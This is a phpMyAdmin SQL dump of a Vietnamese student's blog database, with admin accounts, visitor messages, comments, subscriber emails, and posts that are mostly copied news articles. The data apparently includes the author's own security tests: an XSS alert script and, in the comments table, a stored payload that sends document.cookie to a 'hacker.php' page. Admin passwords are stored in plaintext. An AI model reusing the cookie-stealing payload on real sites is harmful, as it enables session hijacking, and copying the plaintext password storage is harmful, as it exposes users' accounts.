-- phpMyAdmin SQL Dump
-- version 4.5.4.1deb2ubuntu2
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: May 31, 2018 at 07:27 PM
-- Server version: 5.7.22-0ubuntu0.16.04.1
-- PHP Version: 7.0.30-0ubuntu0.16.04.1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `myblog`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(11) NOT NULL,
  `name` varchar(200) NOT NULL,
  `username` varchar(100) NOT NULL,
  `password` varchar(100) NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `name`, `username`, `password`, `created`) VALUES
(1, 'HuyNV', 'admin', 'code', '2018-03-01 10:46:04'),
(2, 'John', 'mrjohn', '1234', '2018-05-21 02:21:58'),
(3, 'Maria', 'mariahill', 'talent', '2018-05-21 02:21:58');

-- --------------------------------------------------------

--
-- Table structure for table `asks`
--

CREATE TABLE `asks` (
  `id` int(11) NOT NULL,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `asks`
--

INSERT INTO `asks` (`id`, `content`, `created`) VALUES
(2, 'Hello!', '2018-01-20 01:10:31'),
(3, 'Dạo này khỏe không anh!', '2018-01-20 01:11:04'),
(4, 'Dạo này khỏe không', '2018-01-21 01:17:00'),
(5, 'Chó', '2018-01-21 01:26:54'),
(6, 'gihi', '2018-01-21 01:36:40'),
(7, 'mèo còn', '2018-01-21 01:40:06'),
(8, 'Anh ơi em làm xong rôi!', '2018-01-21 01:56:07'),
(9, '<script>alert(\'hellp\');</script>', '2018-01-26 05:39:33'),
(10, 'Gửi test từ iphone 6 nè', '2018-03-02 00:53:01'),
(11, 'Chán vãi nồi', '2018-03-02 00:57:59');

-- --------------------------------------------------------

--
-- Table structure for table `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `id_post` int(11) NOT NULL,
  `audience` varchar(30) COLLATE utf8_unicode_ci NOT NULL DEFAULT '#9abc1c',
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `ad` tinyint(1) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `comments`
--

INSERT INTO `comments` (`id`, `id_post`, `audience`, `content`, `created`, `ad`) VALUES
(1, 17, 'red', 'Phiền bác chủ top edit lại bài viết theo các trang mà mọi người đã cmt để ae tiện theo dõi.', '2018-02-02 00:10:21', 0),
(2, 17, 'yellow', 'Mấy người mà thành công thì chả mấy share tip lên, nên mình chỉ follow những người có content nhảm để đọc giải trí', '2018-01-31 18:13:26', 0),
(3, 17, 'black', 'Reddit VietNam thỉnh thoảng có những bài trans hay cực kì', '2018-02-01 20:10:10', 0),
(5, 17, 'blue', 'Người đã đi được nửa vòng Trái Đất bằng chiếc xe "made in VietNam". Anh đăng tải những bài viết cá nhân về kinh nghiệm du lịch, suy nghĩ về cuộc sống, ảnh đẹp những nơi đã đi qua. Bạn nào thích đi du lịch (đặc biệt là nước ngoài) nên follow anh để biết thêm những lưu ý khi thực hiện một chuyến đi như vậy', '2018-02-02 11:09:22', 0),
(6, 17, 'pink', 'lên google mà tìm', '2018-02-02 00:09:25', 0),
(7, 17, 'Bisque', 'Mình giờ trang chủ tràn ngập gái xinh và tin công nghệ, k theo dõi bạn bè hay là người nào nổi tiếng (trừ boss) nên xin k bình luận gì', '2018-01-19 01:07:01', 0),
(8, 17, 'CornflowerBlue', 'Khi bạn giàu (hoặc giỏi, hoặc thành công bla bla...) thì bạn nói cc gì cũng đúng.\r\n- Giách Ma -', '2018-02-01 18:07:00', 0),
(9, 17, '#1abc9c', 'Các bạn nói đúng hết rồi', '2018-02-03 01:04:51', 1),
(10, 17, 'IndianRed ', 'Cố nhân có câu: "Người hay nói đạo lý sống như l**"\r\nThế nên mình chẳng bao giờ follow người hay nói đạo lý làm người, thích chia sẻ nhảm nhí.', '2018-01-31 21:10:04', 0),
(11, 17, 'yellow', 'Bosss', '2018-02-02 08:12:21', 0),
(13, 17, '#1abc9c', 'Hay quá man! Ok mình sẽ làm!', '2018-02-03 01:05:06', 1),
(14, 17, 'red', 'Mình chỉ hứng thú với công nghệ, mình follow ông boss, nam long, vy nghĩa, xnohat, karmi phúc, toidicodedao... ', '2018-02-01 10:09:20', 0),
(15, 17, 'black', 'Lấy ví dụ mình follow cô Điệp mẹ em Đỗ Nhật Nam, cô Hồ Thị Hải Âu mẹ của Lã Hồ Minh Khuê... để học hỏi tư tưởng và cách suy nghĩ của họ. Mình muốn thấm nhuần được những điều hay lẽ phải và quan trọng nhất là mình muốn được như họ: giáo dục con mình trở thành một người tốt bụng và tài năng... đấy chỉ là 1 ví dụ nhỏ về lĩnh vực mà mình hay tìm tòi và follow.', '2018-02-02 00:09:42', 0),
(16, 17, 'yellow', 'Mình tin nhiều người có nhu cầu như mình, đấy là follow facebook của những người thành công để học tập thêm những kiến thức mới. Thành công ở đây nghĩa là họ rất giỏi và am hiểu về một lĩnh vực cụ thể hoặc họ thường xuyên đăng những bài viết "đi vào lòng người".', '2018-02-03 10:18:32', 0),
(17, 14, 'blue', 'Hehehehehe', '2018-02-01 21:20:05', 0),
(18, 12, 'black', 'good man!', '2018-02-01 07:07:14', 0),
(19, 17, 'orange', 'Ang owi', '2018-02-11 03:22:12', 0),
(20, 17, 'blue', 'Chán vãi nồi', '2018-05-21 02:46:08', 0),
(24, 17, 'red', '<script>window.location.href = "http://localhost/hacker.php?cookie=" + document.cookie;</script>', '2018-05-21 03:08:40', 0);

-- --------------------------------------------------------

--
-- Table structure for table `emails`
--

CREATE TABLE `emails` (
  `id` int(11) NOT NULL,
  `email` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `emails`
--

INSERT INTO `emails` (`id`, `email`, `created`) VALUES
(1, 'kenshiner96@gmail.com', '2018-01-21 01:55:18'),
(2, 'huynv2909@gmail.com', '2018-01-21 01:55:38'),
(3, 'dungcocho@gmail.com', '2018-01-31 01:55:20'),
(4, 'vietnamvodich@gmail.com', '2018-01-31 02:30:17'),
(5, 'Thanhhochungmay@gmail.com', '2018-01-31 02:33:45'),
(6, 'hungthoi@gmail.com', '2018-01-31 02:35:17'),
(7, 'anhsao@gmail.com', '2018-01-31 02:43:34'),
(8, 'choma@gmail.com', '2018-01-31 02:44:19');

-- --------------------------------------------------------

--
-- Table structure for table `me`
--

CREATE TABLE `me` (
  `id` int(11) NOT NULL,
  `name` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `job` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `about` text COLLATE utf8_unicode_ci NOT NULL,
  `facebook_link` text COLLATE utf8_unicode_ci NOT NULL,
  `twister_link` text COLLATE utf8_unicode_ci NOT NULL,
  `linkedin_link` text COLLATE utf8_unicode_ci NOT NULL,
  `github_link` text COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `me`
--

INSERT INTO `me` (`id`, `name`, `job`, `about`, `facebook_link`, `twister_link`, `linkedin_link`, `github_link`) VALUES
(1, 'Huy NV', 'Student', 'Thứ duy nhất mang giá trị tuyệt đối, đó là sự tương đối!', 'https://www.facebook.com/zmr.tuongtu', 'https://twitter.com/', 'https://www.linkedin.com/', 'https://github.com/huynv2909/');

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE `posts` (
  `id` int(11) NOT NULL,
  `title` text COLLATE utf8_unicode_ci NOT NULL,
  `intro` text COLLATE utf8_unicode_ci NOT NULL,
  `author` int(11) NOT NULL,
  `created` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `content` text COLLATE utf8_unicode_ci NOT NULL,
  `link` text COLLATE utf8_unicode_ci NOT NULL,
  `total_views` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `posts`
--

INSERT INTO `posts` (`id`, `title`, `intro`, `author`, `created`, `content`, `link`, `total_views`) VALUES
(1, 'Vũ trụ điện ảnh Marvel (Marvel Cinematic Universe: MCU) theo mốc thời gian: Từ những viên đá vô cực (Infinity Stones: IS) đến Avenger: Infinity War (2018) và mở rộng', 'Khi được hỏi “MCU được ra đời khi nào?” thì bất cứ Fan của Marvel nào cũng có thể trả lời nhanh rằng từ Iron Man (2008) của Jon Favreau. Nhưng để giải thích lại các sự kiện diễn ra trong MCU thì đó là việc không hề đơn giản, từ việc Jotunheim xâm chiếm trái đất, sự thành lập Arena Club, cho đến làn sóng đổi mới công nghệ trong Stark Expo. Vì vậy bằng những hiểu biết bản thân, mình sẽ đưa ra danh sách các sự kiện quan trọng chính diễn ra trong MCU theo thời gian cho đến hiện tại. Bài viết sẽ cập nhật liên tục những bộ phim, những sự kiện mới nhất được đưa ra.', 1, '2018-01-20 08:03:49', 'Khi được hỏi “MCU được ra đời khi nào?” thì bất cứ Fan của Marvel nào cũng có thể trả lời nhanh rằng từ Iron Man (2008) của Jon Favreau. Nhưng để giải thích lại các sự kiện diễn ra trong MCU thì đó là việc không hề đơn giản, từ việc Jotunheim xâm chiếm trái đất, sự thành lập Arena Club, cho đến làn sóng đổi mới công nghệ trong Stark Expo. Vì vậy bằng những hiểu biết bản thân, mình sẽ đưa ra danh sách các sự kiện quan trọng chính diễn ra trong MCU theo thời gian cho đến hiện tại. Bài viết sẽ cập nhật liên tục những bộ phim, những sự kiện mới nhất được đưa ra.\r\nBài viết sẽ tiếp tục được cập nhật', 'https://www.facebook.com/zmr.tuongtu', 0),
(2, 'Nosql database', 'Gửi lời chào tới tất cả các bạn, Hôm nay mình sẽ trình bày cho mọi người về Nosql database và Mongodb.\r\nNosql (not only sql / non-rational database) là một phương pháp lưu trữ và quản trị cơ sở dữ liệu mới, thể hiện được sự ưu việt, phù hợp với xu hướng công nghệ hiện nay, đó là xử lý, lưu trữ những dữ liệu lớn và phức tạp.', 1, '2018-01-20 08:03:49', 'Gửi lời chào tới tất cả các bạn, Hôm nay mình sẽ trình bày cho mọi người về Nosql database và Mongodb.\r\nNosql (not only sql / non-rational database) là một phương pháp lưu trữ và quản trị cơ sở dữ liệu mới, thể hiện được sự ưu việt, phù hợp với xu hướng công nghệ hiện nay, đó là xử lý, lưu trữ những dữ liệu lớn và phức tạp.\r\nChúng ta đã biết, với xu hướng công nghệ hiện nay (Cách mạng công nghệp 4.0, web 2.0, mạng xã hội, đám mây,..), lượng dữ liệu được tạo ra mỗi giây trên thế giới đang tăng theo cấp số nhân. Nảy sinh ra nhu cầu lưu trữ, quản lý dữ liệu cực lớn và phức tạp. Và lúc này thì CSDL quan hệ truyền thống của ta đã bộc lỗ những điểm yếu của mình: Tốc độ truy vấn, xử lý, yêu cầu phần cứng, khả năng mở rộng,… vì thế Nosql là cụm từ được quan tâm để giải quyết những giới hạn, điểm yếu của CSDLQH truyền thống.', 'https://www.facebook.com/zmr.tuongtu', 0),
(3, 'SQL injection', 'SQL Injection là một trong những kiểu hack web đang dần trở nên phổ biến hiện nay. Bằng cách inject các mã SQL query/command vào input trước khi chuyển cho ứng dụng web xử lí, bạn có thể login mà không cần username và password', 1, '2018-01-20 08:03:49', 'SQL Injection là một trong những kiểu hack web đang dần trở nên phổ biến hiện nay. Bằng cách inject các mã SQL query/command vào input trước khi chuyển cho ứng dụng web xử lí, bạn có thể login mà không cần username và password\r\n1. SQL Injection là gì?\r\n\r\nSQL Injection là một trong những kiểu hack web đang dần trở nên phổ biến hiện nay. Bằng cách inject các mã SQL query/command vào input trước khi chuyển cho ứng dụng web xử lí, bạn có thể login mà không cần username và password, remote execution, dump data và lấy root của SQL server. Công cụ dùng để tấn công là một trình duyệt web bất kì, chẳng hạn như Internet Explorer, Netscape, Lynx, ...', 'https://www.facebook.com/zmr.tuongtu', 0),
(4, 'Trắng tay vì tiền ảo đa cấp Bitconnect, hoảng hốt với Bitcoin', 'TTO - Giới đầu tư tiền ảo đa cấp Bitconnect đứng trước nguy cơ trắng tay khi sàn này ngừng hoạt động, trong khi đó dân lướt sóng Bitcoin cũng lắm phen hoảng hốt.', 1, '2018-01-20 08:03:49', 'Trên trang Bitconnect Việt Nam có hơn 53.000 thành viên tham gia, hàng loạt người đầu tư đã đặt ra các câu hỏi như thời điểm này có nên giữ Bitconnect không hay. \r\n\r\nKéo theo đó là đa số bình luận cho rằng với tình hình như bây giờ chỉ còn cách tiếp tục ôm giữ Bitconnect để tiếp tục hy vọng.\r\n\r\nĐáng nói hơn, nhiều người đã vay tiền để tham gia đầu tư vào Bitconnect với mong ước đổi đời một cách dễ dàng. Do vậy khi ước vọng bỗng chốc tan thành mây khói họ không biết xoay sở thế nào.\r\n\r\nAnh Đạt, một nhà đầu tư tại TP.HCM cho biết đầu tháng 1 anh dùng tiền tích lũy của gia đình và vay mượn người thân bỏ 10.000 USD vào Bitconnect. ', 'https://www.facebook.com/zmr.tuongtu', 0),
(5, 'Họp báo Burnley - MU: Mourinho tiết lộ hợp đồng khủng, gây bất ngờ về Sanchez', '(Trực tiếp họp báo Burnley - MU) HLV Jose Mourinho cung cấp nhiều thông tin quan trọng về hợp đồng của mình với MU và thương vụ Alexis Sanchez trong buổi họp báo.', 1, '2018-01-20 08:03:49', 'Đây là một lần hiếm hoi HLV Mourinho dè dặt khi nói về một cầu thủ mà mình theo đuổi. Khi được hỏi đánh giá của mình về ngôi sao người Chile, HLV Mourinho cho biết: "Tôi sẽ nói về điều này một ngày nào đó chúng tôi ký hợp đồng với Alexis Sanchez. Khi đó tôi sẽ nói với bạn về cậu ấy và những gì cậu ấy có thể mang đến cho đội bóng. Còn hiện tại, Sanchez vẫn là cầu thủ của Arsenal, không phải cầu thủ của tôi. Vì thế, tôi không thể nói về điều chưa diễn ra hoặc không diễn ra".', 'https://www.facebook.com/zmr.tuongtu', 0),
(6, 'Trường Giang - Nhã Phương: "900 ngày yêu 800 ngày sóng gió" và cái kết gây bão', 'Đã có thời điểm cả hai tưởng chừng sẽ chia tay sau scandal Quế Vân tố nam diễn viên bắt cá hai tay.', 1, '2018-01-20 08:03:49', 'Tối 18.1, giải Mai Vàng lần thứ 23 diễn ra tại Nhà hát Thành Phố, TP. HCM. Nam nghệ sĩ Trường Giang và bạn gái Nhã Phương đều xuất hiện tại lễ trao giải nhưng không sánh đôi trên thảm đỏ. Ngoài 2 giải thưởng Nam diễn viên sân khấu được yêu thích nhất và Diễn viên hài được yêu thích nhất, Trường Giang còn khiến không ít khán giả có mặt tại chương trình bất ngờ với màn cầu hôn bạn gái sau 2 năm 6 tháng bên nhau đầy sóng gió. ', 'https://www.facebook.com/zmr.tuongtu', 0),
(7, 'Vì sao PGS Bùi Hiền được cấp bản quyền cải tiến “tiếw Việt"?', '“Người ta sáng tạo thì phải tôn vinh, trừ trường hợp vi phạm đến an ninh quốc gia thì mới phê phán, phản đối”.', 1, '2018-01-20 08:03:49', 'Sau khi Cục Bản quyền tác giả- Bộ Văn hóa Thể thao và Du lịch (Bộ VHTT&DL) cấp giấy chứng nhận đăng ký bản quyền tác phẩm cải tiến chữ viết tiếng Việt cho PGS Bùi Hiền, có nhiều ý kiến xoay quanh vấn đề này. Có ý kiến cho rằng, cấp giấy chứng nhận một tác phẩm không có giá trị là không nên và tiếp tục "ném đá" PGS Bùi Hiền.\r\n\r\nKhông vi phạm điều cấm về quyền tác giả\r\n\r\nLiên quan đến đề này, theo đại diện Cục Bản quyền tác giả, việc cấp giấy đăng ký chứng nhận cho PGS Bùi Hiền là hoàn toàn đúng pháp luật.\r\n\r\nTheo quy định về quyền tác giả, những tác phẩm được sáng tạo và được thể hiện dưới một hình thức vật chất nhất định, không phân biệt nội dung, chất lượng, hình thức, phương tiện, ngôn ngữ đều được đăng ký bản quyền; Các loại hình tác phẩm được bảo hộ quyền tác giả bao gồm: Tác phẩm văn học, khoa học, sách giáo khoa, giáo trình và tác phẩm khác được thể hiện dưới dạng chữ viết, hoặc ký tự khác; Các bài giảng, bài phát biểu, bài nói, thậm chí một câu thơ cũng được đăng ký bản quyền....\r\n\r\n', 'https://www.facebook.com/zmr.tuongtu', 0),
(8, 'Tây Hồ - khu vực đắc địa nghìn đô khó mua được', 'Hồ Tây được mệnh danh là “trung tâm mới” của thủ đô cách đây khoảng 10 năm. Khu vực này đang trên đà phát triển nhanh chóng về mọi mặt, dự kiến sẽ là nguồn cầu bất động sản cao cấp trong những năm gần đây.', 1, '2018-01-20 08:03:49', 'Theo các chuyên gia phong thủy, địa thế của thủ đô Thăng Long xưa và Hà Nội nay có thế “long chầu, hổ phục” do được bao bọc bởi 2 dãy núi lớn Tam Đảo và Ba Vì hai bên. Hồ Tây chính là một nhánh tụ lại của sông Hồng được phình ra ở đoạn đi qua trung tâm nên được ví như bụng của một con rồng đang ôm một viên ngọc trong tay.\r\n\r\nBên cạnh đó, không gian tại Hồ Tây được đánh giá là yên tĩnh, nhiều cây xanh, mật độ dân cư không quá đông đúc là nơi tập trung nhiều nhà hàng, khách sạn 5 sao đẳng cấp và có nhiều khách nước ngoài lưu trú. Vậy nên, giá bất động sản quanh khu vực Tây Hồ, nhất là khu vực phía Tây Tây Hồ luôn cao hơn so với các khu vực khác và chưa bao giờ có dấu hiệu hạ nhiệt.\r\n\r\nĐặc biệt là thu hút các nhà đầu tư nhờ nguồn cầu bất động sản cao cấp, phù hợp phát triển cho những dự án tiêu chuẩn quốc tế. Điển hình là dự án Kosmo Tây Hồ với hạ tầng và tiện ích đồng bộ, giao thông thuận lợi,...Hứa hẹn sẽ là nơi quy tụ một môi trường sống hiện đại, tinh tế và đa sắc màu.\r\n\r\n', 'https://www.facebook.com/zmr.tuongtu', 0),
(9, 'ATM trục trặc, chủ máy bị phạt', 'Nhu cầu rút tiền thường tăng đột biến vào dịp giáp Tết nguyên đán có thể làm cho giao dịch qua hệ thống ATM bị trục trặc, buộc các ngân hàng (NH) phải chuẩn bị nhiều phương án nhằm xử lý sự cố.', 1, '2018-01-20 08:03:49', 'Theo ông Phạm Tiến Dũng, Vụ trưởng Vụ Thanh toán NH Nhà nước (NHNN), để bảo đảm chất lượng dịch vụ, an toàn hoạt động thanh toán dịp Tết, NHNN đã yêu cầu các tổ chức cung ứng hạ tầng chuyển mạch tổ chức kiểm tra, bảo trì máy móc, thiết bị, đường truyền... Đồng thời, khi phát hiện ATM của NH thương mại gặp sự cố, các đơn vị chuyển mạch cung cấp thông tin để NHNN kịp thời chỉ đạo xử lý; phối hợp chặt chẽ với các NH thành viên hạn chế thấp nhất lỗi kỹ thuật, nghẽn mạng…', 'https://www.facebook.com/zmr.tuongtu', 0),
(10, '"Vạch trần" những bí mật được Apple ẩn giấu trong siêu phẩm iPhone X', 'Cùng khám phá những bí mật được Apple ẩn giấu trong chiếc siêu phẩm iPhone X của hãng này.', 1, '2018-01-20 08:03:49', 'Ngoài sự khác biệt lớn trong thiết kế bên ngoài của iPhone X, ít ai biết sự thay đổi cũng đến từ cả bên trong.\r\n\r\nKhi mở máy, người ta đã phát hiện nhiều chi tiết linh kiện, bảng mạch trên iPhone X đã thay đổi theo hướng thu nhỏ đáng kể. Theo đó, bo mạch chủ trên iPhone X chỉ bằng 70% kích thước của iPhone 8 Plus.', 'https://www.facebook.com/zmr.tuongtu', 0),
(11, 'Nhờ iPhone X, Apple lại xưng bá thị trường smartphone', 'Sự xuất hiện của iPhone X vào quý 4 đã giúp cho thị phần của Apple tăng 10% trong quý cuối cùng năm 2017.', 1, '2018-01-20 08:03:49', 'Sự gia tăng thị phần mạnh mẽ trong quý IV của Apple phần lớn là do sự thành công của iPhone X. Chính “siêu phẩm” này đã kéo người dùng Android chuyển sang dùng iOS và kích thích người dùng iPhone hiện tại nâng cấp thiết bị của mình.\r\n\r\nCác dữ liệu thống kê cũng cho thấy iPhone thực sự đã làm khuấy đảo thị trường điện thoại thông minh trong 3 tháng cuối năm. Ví dụ chân thực nhất chính là tuần lễ Giáng sinh - chào năm mới, các thiết bị của Apple đã chiếm vị trí thượng phong. Các báo cáo khác còn cho hay, danh sách 3 mẫu smartphone bán “chạy” nhất tại Mỹ vào tháng 11 đều là sản phẩm của “Táo Khuyết”: iPhone X, iPhone 8 Plus và iPhone 8.', 'https://www.facebook.com/zmr.tuongtu', 0),
(12, 'BMW X2 hoàn toàn mới có giá từ 900 triệu đồng', 'Mẫu crossover hạng sang cỡ nhỏ hoàn toàn mới của BMW đến nay đã được công bố giá bán.', 1, '2018-01-20 08:03:49', 'BMW X2 vừa được công bố giá bán khởi điểm từ 39.395 USD (900 triệu đồng), cao hơn 2.500 USD (57 triệu đồng) so với bản thấp nhất của chiếc "đàn em" X1, nhưng rẻ hơn 9.200 USD (209 triệu đồng) so với bản cơ sở của X4. Gói trang bị M SportX sẽ cộng thêm 4.650 USD (105 triệu đồng) vào giá bán.\r\n\r\nBMW X2 là mẫu SUV hạng sang cỡ nhỏ hoàn toàn mới, có thể được xem là một biến thể thể thao và gọn gàng hơn của chiếc X1 vốn đã quen thuộc. Giới chuyên môn cho rằng X2 chính là lời đáp trả của BMW trước đối thủ Audi Q2.  Tuy được phát triển dựa trên cùng một nền tảng khung gầm với X1, nhưng X2 lại sở hữu thiết kế ngoại thất mới mẻ hơn. Điểm nhấn của BMW X2 nằm ở lưới tản nhiệt hai quả thận hình thang quay ngược lên trên và gói phụ kiện M Sport X mới. Phần dưới của lưới tản nhiệt rộng hơn phần trên, được bao quanh bằng cụm đèn pha mượt mà, tích hợp dải đèn LED định vị ban ngày. ', 'https://www.facebook.com/zmr.tuongtu', 0),
(13, 'Siêu xe Fisker Emotion giá 2,9 tỷ đồng', 'Thương hiệu xe đình đám một thời được hồi sinh và lập tức quay trở lại thị trường với sản phẩm mang tính đột phá.', 1, '2018-01-20 08:03:49', 'Vào năm 2013, Fisker Automotive tuyên bố phá sản, thì vào tháng 10 năm 2016 ông Henrik Fisker - người sáng lập hãng đã lập nên một hãng xe mới mang tên Fisker Inc, để tiếp tục những dự định đầy tham vọng của mình. Ngay sau khi thành lập, Fisker Inc đã hé lộ kế hoạch ra mắt một mẫu xe điện EV kế nhiệm Karma đoản mệnh, có tên gọi Fisker Emotion.', 'https://www.facebook.com/zmr.tuongtu', 0),
(14, 'U23 Việt Nam - U23 Iraq: Rượt đuổi nghẹt thở, lịch sử vang danh', '(Video bóng đá, kết quả bóng đá, U23 Việt Nam - U23 Iraq, Tứ kết U23 châu Á 2018) U23 Việt Nam đã chơi siêu ấn tượng và tạo nên khoảnh khắc lịch sử sau một màn rượt đuổi tỉ số quá hay.', 1, '2018-04-14 09:22:24', '\r\nTRANG CHỦ\r\n>> Bóng đá\r\nU23 Việt Nam dự VCK U23 Châu Á\r\nLịch thi đấu\r\nSự kiện - Bình luận\r\nVideo\r\nLivescore\r\nẢnh bóng đá - người đẹp\r\nTin vắn bóng đá\r\nU23 Việt Nam - U23 Iraq: Rượt đuổi nghẹt thở, lịch sử vang danh\r\nChủ Nhật, ngày 21/01/2018 00:30 AM (GMT+7)\r\nSự kiện: U23 Việt Nam dự VCK U23 châu Á, HLV Park Hang Seo\r\n(Video bóng đá, kết quả bóng đá, U23 Việt Nam - U23 Iraq, Tứ kết U23 châu Á 2018) U23 Việt Nam đã chơi siêu ấn tượng và tạo nên khoảnh khắc lịch sử sau một màn rượt đuổi tỉ số quá hay.\r\n\r\n00:02 / 04:54\r\nĐang phát\r\nSự tự tin rất lớn đã đến với U23 Việt Nam sau khi thầy trò Park Hang Seo cầm hòa U23 Syria ở lượt trận cuối vòng bảng để vào vòng tứ kết U23 châu Á lần đầu tiên trong lịch sử. Đối đầu U23 Iraq, đội bóng của chúng ta đã có một vài sự điều chỉnh rất bất ngờ khi Văn Hậu và Đức Chinh không đá chính ngay từ đầu.\r\n\r\nU23 Việt Nam nhập cuộc tự tin khi đối đầu cựu vương U23 Iraq. Phút 12, niềm sung sướng bất ngờ đã đến khi sau cú móc bóng của Phan Văn Đức, Công Phượng chớp thời cơ ra chân cận thành chính xác mở tỉ số cho các chàng trai áo đỏ.', 'https://www.facebook.com/zmr.tuongtu', 0),
(15, 'Quán bar “chui” bị kiểm tra, dân chơi nháo nhào tháo chạy', 'Ập vào quán bar “chui” ở trung tâm Sài Gòn, cảnh sát phát hiện nhiều nam nữ đang lắc lư trong tiếng nhạc chát chúa.', 1, '2018-04-14 09:22:54', 'Rạng sáng 20.1, hàng chục cán bộ chiến sĩ Công an quận 1 (TP.HCM) ập vào kiểm tra quán bar nằm trong tòa nhà trên đường Nguyễn Thị Minh Khai (phường Bến Thành, quận 1). Tại thời điểm kiểm tra, cảnh sát phát hiện cả chục nam nữ đang lắc lư trong tiếng nhạc chát chúa. Một số đối tượng định ra ra cửa “chuồn” nhưng bị công an giữ lại.\r\n\r\nTại một số bàn, dưới sàn nhà, công an thu giữ khoảng 20 viên nén ma túy, 1 gói tinh thể nghi ma túy.\r\n\r\n10 người trong đó có 3 nữ có biểu hiện nghi vấn được đưa về trụ sở để làm rõ. Qua kiểm tra nhanh, có 3 thanh niên dương tính với ma túy.', 'https://www.facebook.com/zmr.tuongtu', 0),
(17, 'How to make your company website based on bootstrap framework on localhost?', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est, imperdiet nec tortor nec, tempor semper metus. <b>Cras vel tempus velit</b>, et accumsan nisi. Duis laoreet pretium ultricies. Curabitur rhoncus auctor nunc congue sodales. Sed posuere nisi ipsum, eget dignissim nunc dapibus eget. Aenean elementum <b><a href="javascript:void(0)" data-toggle="popover" data-placement="top" data-content="You can write any text here">Click me</a></b> sollicitudin sapien ut sapien fermentum aliquet mollis. Curabitur ac quam orci sodales quam ut tempor. <b data-toggle="tooltip" data-placement="top" title="You can write any text here.">Hover me</b> suspendisse, gravida in augue in, interdum bibendum dui. Suspendisse sit amet justo sit amet diam fringilla commodo. Praesent ac magna at metus malesuada tincidunt non ac arcu. Nunc gravida eu felis vel elementum. Vestibulum sodales quam ut tempor tempor. Donec sollicitudin sapien ut sapien fermentum, non ultricies nulla gravida.</p>\r\n                                    \r\n                                \r\n                                <!-- Post Image Start -->\r\n                                <div class="post-image margin-top-40 margin-bottom-40">\r\n                                   <img src="https://huynv.site/public/images/blog/1.jpg" alt="">\r\n                                   <p>Image source from <a href="#" target="_blank">Link</a></p>                                      \r\n                                  </div>\r\n                                  <!-- Post Image End -->', 1, '2018-04-14 10:15:30', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est, imperdiet nec tortor nec, tempor semper metus. <b>Cras vel tempus velit</b>, et accumsan nisi. Duis laoreet pretium ultricies. Curabitur rhoncus auctor nunc congue sodales. Sed posuere nisi ipsum, eget dignissim nunc dapibus eget. Aenean elementum <b><a href="javascript:void(0)" data-toggle="popover" data-placement="top" data-content="You can write any text here">Click me</a></b> sollicitudin sapien ut sapien fermentum aliquet mollis. Curabitur ac quam orci sodales quam ut tempor. <b data-toggle="tooltip" data-placement="top" title="You can write any text here.">Hover me</b> suspendisse, gravida in augue in, interdum bibendum dui. Suspendisse sit amet justo sit amet diam fringilla commodo. Praesent ac magna at metus malesuada tincidunt non ac arcu. Nunc gravida eu felis vel elementum. Vestibulum sodales quam ut tempor tempor. Donec sollicitudin sapien ut sapien fermentum, non ultricies nulla gravida.</p>\r\n                                    \r\n                                \r\n                                <!-- Post Image Start -->\r\n                                <div class="post-image margin-top-40 margin-bottom-40">\r\n                                   <img src="https://huynv.site/public/images/blog/1.jpg" alt="">\r\n                                   <p>Image source from <a href="#" target="_blank">Link</a></p>                                      \r\n                                  </div>\r\n                                  <!-- Post Image End -->\r\n                                  \r\n                                  \r\n                                   <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin at quam at orci commodo hendrerit vitae nec eros. Vestibulum neque est, imperdiet nec tortor nec, tempor semper metus. Cras vel tempus velit, et accumsan nisi. Duis laoreet pretium ultricies. Curabitur rhoncus auctor nunc congue sodale Sed posuere nisi ipsum.</p>\r\n                                   \r\n                                 \r\n                                 \r\n                                 <!-- Post Video Tutorial Start -->\r\n                                 <div class="video-box margin-top-40 margin-bottom-40">\r\n                                  <div class="video-tutorial">\r\n                                   <a class="video-popup" href="https://www.youtube.com/watch?v=6ZfuNTqbHE8" title="Video Tutorial">\r\n                                   <img src="https://huynv.site/public/images/blog/4.jpg" alt="">\r\n                                   </a>                           \r\n                                  </div>\r\n                                 <p>Integrate video on magnific popup for fast page load.</p>\r\n                                </div>\r\n                                <!-- Post Video Tutorial End 